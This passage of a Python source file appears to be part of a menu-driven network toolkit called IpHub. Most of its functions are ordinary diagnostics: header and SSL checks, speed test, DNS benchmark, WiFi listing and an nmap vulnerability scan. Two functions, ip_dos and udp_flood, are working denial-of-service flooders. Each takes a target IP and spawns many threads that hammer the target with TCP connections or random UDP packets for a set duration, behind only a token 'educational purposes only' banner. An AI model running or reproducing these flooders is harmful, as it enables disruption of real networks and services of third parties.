        print(f"{BLUE}{{/}} Checking headers...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Checking headers", stop_event))
        anim_thread.start()
        
        response = requests.head(url, timeout=10, allow_redirects=True)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        print_result("URL", url, GREEN)
        print_result("Status Code", response.status_code, 
                    GREEN if response.status_code == 200 else YELLOW)
        
        security_headers = ['server', 'x-powered-by', 'x-frame-options', 
                          'x-content-type-options', 'strict-transport-security',
                          'content-security-policy']
        
        print(f"\n{BLUE}Security Headers:{RESET}")
        for header in security_headers:
            if header in response.headers:
                print(f"  {GREEN}✓ {header}: {WHITE}{response.headers[header]}{RESET}")
            else:
                print(f"  {RED}✗ {header}: {YELLOW}Missing{RESET}")
        
        print(f"\n{BLUE}All Headers:{RESET}")
        for header, value in response.headers.items():
            if header not in security_headers:
                print(f"  {BLUE}• {header}: {WHITE}{value}{RESET}")
            
    except requests.exceptions.RequestException as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def speed_test():
    print_section_header("SPEED TEST")
    print(f"{BLUE}{{/}} Testing internet speed...{RESET}", end='', flush=True)
    
    try:
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Testing speed", stop_event))
        anim_thread.start()
        
        st = speedtest.Speedtest()
        st.get_best_server()
        
        download_speed = st.download() / 1_000_000
        upload_speed = st.upload() / 1_000_000
        ping = st.results.ping
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        print_result("Download Speed", f"{download_speed:.2f} Mbps", GREEN)
        print_result("Upload Speed", f"{upload_speed:.2f} Mbps", GREEN)
        print_result("Ping", f"{ping:.2f} ms", GREEN)
        print_result("Server", st.results.server['name'])
        print_result("ISP", st.results.client['isp'])
        
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def wifi_scanner():
    print_section_header("WIFI SCANNER")
    
    if os.name != 'posix':
        print(f"{RED}This feature is only available on Linux systems{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print(f"{BLUE}{{/}} Scanning WiFi networks...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Scanning WiFi", stop_event))
        anim_thread.start()
        
        result = subprocess.run(['nmcli', '-f', 'SSID,SIGNAL,SECURITY', 'dev', 'wifi'], 
                              capture_output=True, text=True, timeout=30)
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        print(result.stdout)
        
    except FileNotFoundError:
        print(f"{RED}nmcli not available. Install NetworkManager.{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def dns_benchmark():
    print_section_header("DNS BENCHMARK")
    
    dns_servers = {
        'Google': '8.8.8.8',
        'Cloudflare': '1.1.1.1',
        'OpenDNS': '208.67.222.222',
        'Quad9': '9.9.9.9',
        'Comodo': '8.26.56.26'
    }
    
    test_domains = ['google.com', 'facebook.com', 'amazon.com', 'netflix.com', 'github.com']
    
    results = {}
    
    print(f"{BLUE}{{/}} Benchmarking DNS servers...{RESET}")
    
    for name, server in dns_servers.items():
        print(f"{CYAN}Testing {name} ({server})...{RESET}")
        total_time = 0
        successful = 0
        
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [server]
        resolver.timeout = 3
        resolver.lifetime = 3
        
        for domain in test_domains:
            try:
                start_time = time.time()
                answers = resolver.resolve(domain, 'A')
                end_time = time.time()
                total_time += (end_time - start_time) * 1000
                successful += 1
            except:
                pass
        
        if successful > 0:
            avg_time = total_time / successful
            results[name] = avg_time
            print(f"  {GREEN}Average: {avg_time:.2f} ms ({successful}/5 successful){RESET}")
        else:
            results[name] = float('inf')
            print(f"  {RED}Failed all queries{RESET}")
    
    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{GREEN}DNS Benchmark Results:{RESET}")
    
    sorted_results = sorted(results.items(), key=lambda x: x[1])
    for i, (name, time_ms) in enumerate(sorted_results):
        if time_ms == float('inf'):
            print(f"{i+1}. {RED}{name}: Failed{RESET}")
        else:
            print(f"{i+1}. {GREEN}{name}: {time_ms:.2f} ms{RESET}")
    
    input("\nPress Enter to continue...")

def http_https_check():
    print(f"{CYAN}{{¿}} Enter domain{RESET}")
    domain = input("> ").strip()
    
    if not domain:
        print(f"{RED}Error: Please enter a valid domain{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("HTTP/HTTPS CHECK")
        
        protocols = ['http', 'https']
        results = {}
        
        for protocol in protocols:
            url = f"{protocol}://{domain}"
            try:
                response = requests.get(url, timeout=10, allow_redirects=True)
                results[protocol] = {
                    'status': response.status_code,
                    'redirects': len(response.history),
                    'final_url': response.url
                }
            except requests.exceptions.RequestException:
                results[protocol] = None
        
        print(f"\n{BLUE}Results for {domain}:{RESET}")
        
        for protocol, result in results.items():
            if result:
                status_color = GREEN if result['status'] == 200 else YELLOW
                print(f"{protocol.upper()}: {status_color}{result['status']}{RESET}")
                if result['redirects'] > 0:
                    print(f"  Redirects: {result['redirects']}")
                    print(f"  Final URL: {result['final_url']}")
            else:
                print(f"{protocol.upper()}: {RED}Failed{RESET}")
                
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def ssl_check():
    print(f"{CYAN}{{¿}} Enter domain{RESET}")
    domain = input("> ").strip()
    
    if not domain:
        print(f"{RED}Error: Please enter a valid domain{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("SSL CHECK")
        print(f"{BLUE}{{/}} Checking SSL certificate...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Checking SSL", stop_event))
        anim_thread.start()
        
        context = ssl.create_default_context()
        with socket.create_connection((domain, 443), timeout=10) as sock:
            with context.wrap_socket(sock, server_hostname=domain) as ssock:
                cert = ssock.getpeercert()
        
        stop_event.set()
        anim_thread.join()
        
        print(f"\r{CYAN}{'='*60}{RESET}")
        
        print_result("Domain", domain, GREEN)
        
        if cert:
            print_result("SSL Certificate", "Valid", GREEN)
            
            not_before = cert.get('notBefore')
            not_after = cert.get('notAfter')
            
            if not_before:
                print_result("Valid From", not_before)
            if not_after:
                print_result("Valid Until", not_after)
                expiry_date = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                days_left = (expiry_date - datetime.now()).days
                status_color = GREEN if days_left > 30 else YELLOW if days_left > 7 else RED
                print_result("Days Left", f"{days_left} days", status_color)
            
            issuer = dict(x[0] for x in cert['issuer'])
            print_result("Issuer", issuer.get('organizationName', 'Unknown'))
            
        else:
            print_result("SSL Certificate", "Invalid", RED)
            
    except ssl.SSLError:
        print(f"{RED}SSL Certificate is invalid or self-signed{RESET}")
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def multi_geolocation():
    print(f"{CYAN}{{¿}} Enter IP addresses (comma separated){RESET}")
    ips_input = input("> ").strip()
    
    if not ips_input:
        print(f"{RED}Error: Please enter valid IP addresses{RESET}")
        input("\nPress Enter to continue...")
        return
    
    ips = [ip.strip() for ip in ips_input.split(',')]
    valid_ips = []
    
    for ip in ips:
        if validate_ip(ip):
            valid_ips.append(ip)
        else:
            print(f"{YELLOW}Invalid IP skipped: {ip}{RESET}")
    
    if not valid_ips:
        print(f"{RED}No valid IP addresses provided{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("MULTI GEOLOCATION")
        
        for ip in valid_ips:
            print(f"\n{BLUE}Geolocation for {ip}:{RESET}")
            
            try:
                url = f"http://ip-api.com/json/{ip}"
                response = requests.get(url, timeout=10)
                data = response.json()
                
                if data['status'] == 'success':
                    print_result("  Country", data.get('country', 'N/A'))
                    print_result("  Region", data.get('regionName', 'N/A'))
                    print_result("  City", data.get('city', 'N/A'))
                    print_result("  ISP", data.get('isp', 'N/A'))
                    if data.get('lat') and data.get('lon'):
                        print_result("  Coordinates", f"{data['lat']}, {data['lon']}")
                else:
                    print(f"  {RED}Could not retrieve information{RESET}")
                    
            except:
                print(f"  {RED}Error retrieving data{RESET}")
                
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def termux_network_info():
    print_section_header("TERMUX NETWORK INFO")
    
    if os.name != 'posix':
        print(f"{RED}This feature is designed for Termux on Android{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        commands = {
            'ifconfig': ['ifconfig'],
            'ip_addr': ['ip', 'addr'],
            'netstat': ['netstat', '-tunap'],
            'wifi_info': ['dumpsys', 'wifi']
        }
        
        for name, cmd in commands.items():
            print(f"\n{BLUE}{name.upper()}:{RESET}")
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
                if result.returncode == 0:
                    print(result.stdout[:500] + "..." if len(result.stdout) > 500 else result.stdout)
                else:
                    print(f"{YELLOW}Command failed{RESET}")
            except:
                print(f"{YELLOW}Command not available{RESET}")
                
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def ip_dos():
    print(f"{RED}WARNING: This is for educational purposes only{RESET}")
    print(f"{RED}Do not use this tool for illegal activities{RESET}")
    
    print(f"{CYAN}{{¿}} Enter target IP{RESET}")
    target_ip = input("> ").strip()
    
    if not validate_ip(target_ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"{CYAN}{{¿}} Enter number of threads (10-1000){RESET}")
    try:
        threads = int(input("> "))
        if threads < 10 or threads > 1000:
            print(f"{RED}Error: Threads must be between 10 and 1000{RESET}")
            input("\nPress Enter to continue...")
            return
    except ValueError:
        print(f"{RED}Error: Please enter a valid number{RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"{CYAN}{{¿}} Enter duration in seconds (10-300){RESET}")
    try:
        duration = int(input("> "))
        if duration < 10 or duration > 300:
            print(f"{RED}Error: Duration must be between 10 and 300 seconds{RESET}")
            input("\nPress Enter to continue...")
            return
    except ValueError:
        print(f"{RED}Error: Please enter a valid number{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("IP DOS ATTACK")
        print(f"{RED}Starting attack on {target_ip} with {threads} threads for {duration} seconds{RESET}")
        
        stop_event = threading.Event()
        
        def attack():
            while not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target_ip, 80))
                    s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target_ip, 80))
                    s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, 80))
                    s.close()
                except:
                    pass
        
        attack_threads = []
        for i in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            attack_threads.append(t)
        
        for t in attack_threads:
            t.start()
        
        print(f"{RED}Attack started. Press Ctrl+C to stop early.{RESET}")
        time.sleep(duration)
        stop_event.set()
        
        print(f"{GREEN}Attack completed.{RESET}")
        
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def udp_flood():
    print(f"{RED}WARNING: This is for educational purposes only{RESET}")
    print(f"{RED}Do not use this tool for illegal activities{RESET}")
    
    print(f"{CYAN}{{¿}} Enter target IP{RESET}")
    target_ip = input("> ").strip()
    
    if not validate_ip(target_ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"{CYAN}{{¿}} Enter target port{RESET}")
    try:
        target_port = int(input("> "))
        if target_port < 1 or target_port > 65535:
            print(f"{RED}Error: Port must be between 1 and 65535{RESET}")
            input("\nPress Enter to continue...")
            return
    except ValueError:
        print(f"{RED}Error: Please enter a valid port number{RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"{CYAN}{{¿}} Combine with TCP flood? (y/n){RESET}")
    combine_tcp = input("> ").lower().strip() == 'y'
    
    print(f"{CYAN}{{¿}} Enter packet size (64-65500){RESET}")
    try:
        packet_size = int(input("> "))
        if packet_size < 64 or packet_size > 65500:
            print(f"{RED}Error: Packet size must be between 64 and 65500{RESET}")
            input("\nPress Enter to continue...")
            return
    except ValueError:
        print(f"{RED}Error: Please enter a valid number{RESET}")
        input("\nPress Enter to continue...")
        return
    
    print(f"{CYAN}{{¿}} Enter duration in seconds (10-300){RESET}")
    try:
        duration = int(input("> "))
        if duration < 10 or duration > 300:
            print(f"{RED}Error: Duration must be between 10 and 300 seconds{RESET}")
            input("\nPress Enter to continue...")
            return
    except ValueError:
        print(f"{RED}Error: Please enter a valid number{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("UDP FLOOD ATTACK")
        print(f"{RED}Starting UDP flood on {target_ip}:{target_port}{RESET}")
        if combine_tcp:
            print(f"{RED}Combining with TCP flood{RESET}")
        
        stop_event = threading.Event()
        packet_data = random._urandom(packet_size)
        
        def udp_attack():
            while not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(packet_data, (target_ip, target_port))
                    s.close()
                except:
                    pass
        
        def tcp_attack():
            while not stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(1)
                    s.connect((target_ip, target_port))
                    s.send(packet_data)
                    s.close()
                except:
                    pass
        
        attack_threads = []
        
        for i in range(100):
            t = threading.Thread(target=udp_attack)
            t.daemon = True
            attack_threads.append(t)
        
        if combine_tcp:
            for i in range(100):
                t = threading.Thread(target=tcp_attack)
                t.daemon = True
                attack_threads.append(t)
        
        for t in attack_threads:
            t.start()
        
        print(f"{RED}Attack started. Press Ctrl+C to stop early.{RESET}")
        time.sleep(duration)
        stop_event.set()
        
        print(f"{GREEN}Attack completed.{RESET}")
        
    except Exception as e:
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def vulnerability_scan():
    print(f"{CYAN}{{¿}} Enter target IP{RESET}")
    target_ip = input("> ").strip()
    
    if not validate_ip(target_ip):
        print(f"{RED}Error: Invalid IP address{RESET}")
        input("\nPress Enter to continue...")
        return
    
    try:
        print_section_header("VULNERABILITY SCAN")
        print(f"{BLUE}{{/}} Scanning for common vulnerabilities...{RESET}", end='', flush=True)
        
        stop_event = threading.Event()
        anim_thread = threading.Thread(target=animate_scanning,
                                     args=("Vulnerability scanning", stop_event))
        anim_thread.start()
        
        try:
            result = subprocess.run(['nmap', '--script', 'vuln', target_ip], 
                                  capture_output=True, text=True, timeout=300)
            
            stop_event.set()
            anim_thread.join()
            
            print(f"\r{CYAN}{'='*60}{RESET}")
            print(result.stdout)
            
            if "VULNERABLE" in result.stdout:
                print(f"{RED}Vulnerabilities found!{RESET}")
            else:
                print(f"{GREEN}No obvious vulnerabilities found{RESET}")
                
        except FileNotFoundError:
            stop_event.set()
            anim_thread.join()
            print(f"\r{RED}Nmap is not installed. Please install nmap for vulnerability scanning.{RESET}")
            
    except subprocess.TimeoutExpired:
        stop_event.set()
        anim_thread.join()
        print(f"\r{RED}Scan timed out{RESET}")
    except Exception as e:
        stop_event.set()
        anim_thread.join()
        print(f"{RED}Error: {str(e)}{RESET}")
    
    input("\nPress Enter to continue...")

def main():
    while True:
        print_banner()
        print_menu()
        
        try:
            choice = input(f"{GREEN}Select an option (1-33): {RESET}").strip()
            
            if choice == '1':
                ip_info()
            elif choice == '2':
                port_scan()
            elif choice == '3':
                service_detection()
            elif choice == '4':
                arp_scan()
            elif choice == '5':
                ping_sweep()
            elif choice == '6':
                netstat()
            elif choice == '7':
                traceroute()
            elif choice == '8':
                advanced_ip_scan()
            elif choice == '9':
                os_detection()
            elif choice == '10':
                get_mac()
            elif choice == '11':
                service_info()
            elif choice == '12':
                whois_lookup()
            elif choice == '13':
                dns_lookup()
            elif choice == '14':
                reverse_dns_lookup()
            elif choice == '15':
                http_headers_check()
            elif choice == '16':
                nmap_scan()
            elif choice == '17':
                tcp_scan()
            elif choice == '18':
                udp_scan()
            elif choice == '19':
                trace_path()
            elif choice == '20':
                print(f"{YELLOW}Subnet Calculator - Coming soon{RESET}")
                input("\nPress Enter to continue...")
            elif choice == '21':
                print(f"{YELLOW}Blacklist Check - Coming soon{RESET}")
                input("\nPress Enter to continue...")
            elif choice == '22':
                print(f"{YELLOW}Save Results - Coming soon{RESET}")
                input("\nPress Enter to continue...")
            elif choice == '23':
                print_section_header("VERSION")
                print(f"{GREEN}IpHub Network Toolkit v2.1 (Early Access){RESET}")
                print(f"{BLUE}GitHub: https://github.com/Demon33gio/IpHub.git{RESET}")
                input("\nPress Enter to continue...")
            elif choice == '24':
                speed_test()
            elif choice == '25':
                dns_benchmark()
            elif choice == '26':
                http_https_check()
            elif choice == '27':
                ssl_check()
            elif choice == '28':
                multi_geolocation()
            elif choice == '29':
                termux_network_info()
            elif choice == '30':
                ip_dos()
            elif choice == '31':
                udp_flood()
            elif choice == '32':
                wifi_scanner()
            elif choice == '33':
                vulnerability_scan()
            elif choice.lower() == 'exit' or choice.lower() == 'quit':
                print(f"{GREEN}Goodbye!{RESET}")
                break
            else:
                print(f"{RED}Invalid option. Please try again.{RESET}")
                time.sleep(1)
                
        except KeyboardInterrupt:
            print(f"\n{GREEN}Goodbye!{RESET}")
            break
        except Exception as e:
            print(f"{RED}Error: {str(e)}{RESET}")
            input("\nPress Enter to continue...")

if __name__ == "__main__":
    main()
    
